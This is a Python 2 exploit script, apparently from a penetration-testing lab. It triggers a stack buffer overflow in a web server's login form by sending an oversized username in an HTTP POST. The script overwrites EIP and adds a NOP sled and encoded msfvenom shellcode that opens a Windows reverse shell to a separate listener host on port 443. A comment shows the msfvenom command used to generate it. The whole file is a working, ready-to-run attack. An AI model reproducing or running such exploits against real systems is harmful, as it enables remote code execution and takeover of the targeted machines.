#!/usr/bin/python
import socket

try:
    print "\nSending evil buffer..."
    filler = "A" * 780
    eip = "\x83\x0c\x09\x10"
    offset = "C" * 4
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.127 LPORT=443 EXITFUNC=thread -f c â€“e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"
    shellcode=(
"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\xd2\x49\xba\xe3\x83\xee\xfc\xe2\xf4\x2e\xa1\x38\xe3\xd2\x49"
"\xda\x6a\x37\x78\x7a\x87\x59\x19\x8a\x68\x80\x45\x31\xb1\xc6"
"\xc2\xc8\xcb\xdd\xfe\xf0\xc5\xe3\xb6\x16\xdf\xb3\x35\xb8\xcf"
"\xf2\x88\x75\xee\xd3\x8e\x58\x11\x80\x1e\x31\xb1\xc2\xc2\xf0"
"\xdf\x59\x05\xab\x9b\x31\x01\xbb\x32\x83\xc2\xe3\xc3\xd3\x9a"
"\x31\xaa\xca\xaa\x80\xaa\x59\x7d\x31\xe2\x04\x78\x45\x4f\x13"
"\x86\xb7\xe2\x15\x71\x5a\x96\x24\x4a\xc7\x1b\xe9\x34\x9e\x96"
"\x36\x11\x31\xbb\xf6\x48\x69\x85\x59\x45\xf1\x68\x8a\x55\xbb"
"\x30\x59\x4d\x31\xe2\x02\xc0\xfe\xc7\xf6\x12\xe1\x82\x8b\x13"
"\xeb\x1c\x32\x16\xe5\xb9\x59\x5b\x51\x6e\x8f\x21\x89\xd1\xd2"
"\x49\xd2\x94\xa1\x7b\xe5\xb7\xba\x05\xcd\xc5\xd5\xb6\x6f\x5b"
"\x42\x48\xba\xe3\xfb\x8d\xee\xb3\xba\x60\x3a\x88\xd2\xb6\x6f"
"\xb3\x82\x19\xea\xa3\x82\x09\xea\x8b\x38\x46\x65\x03\x2d\x9c"
"\x2d\x89\xd7\x21\x7a\x4b\xa5\x36\xd2\xe1\xd2\x48\x01\x6a\x34"
"\x23\xaa\xb5\x85\x21\x23\x46\xa6\x28\x45\x36\x57\x89\xce\xef"
"\x2d\x07\xb2\x96\x3e\x21\x4a\x56\x70\x1f\x45\x36\xba\x2a\xd7"
"\x87\xd2\xc0\x59\xb4\x85\x1e\x8b\x15\xb8\x5b\xe3\xb5\x30\xb4"
"\xdc\x24\x96\x6d\x86\xe2\xd3\xc4\xfe\xc7\xc2\x8f\xba\xa7\x86"
"\x19\xec\xb5\x84\x0f\xec\xad\x84\x1f\xe9\xb5\xba\x30\x76\xdc"
"\x54\xb6\x6f\x6a\x32\x07\xec\xa5\x2d\x79\xd2\xeb\x55\x54\xda"
"\x1c\x07\xf2\x5a\xfe\xf8\x43\xd2\x45\x47\xf4\x27\x1c\x07\x75"
"\xbc\x9f\xd8\xc9\x41\x03\xa7\x4c\x01\xa4\xc1\x3b\xd5\x89\xd2"
"\x1a\x45\x36"
    )
    nops = "\x90" * 10
    inputBuffer = filler + eip + offset + nops + shellcode
    #bad! inputBuffer = filler + eip + offset  + shellcode
    content = "username=" + inputBuffer + "&password=A"
    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.127.10\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://192.168.127.10/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"
    buffer += content
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.127.10", 80))
    s.send(buffer)
    print(buffer)
    data=s.recv(1024)
    print("\n"+data.rstrip())
    s.close()
    print "\nDone!"
    print("Fuzz with "+str(len(inputBuffer))+"Bytes")
except:
    print "Could not connect!"
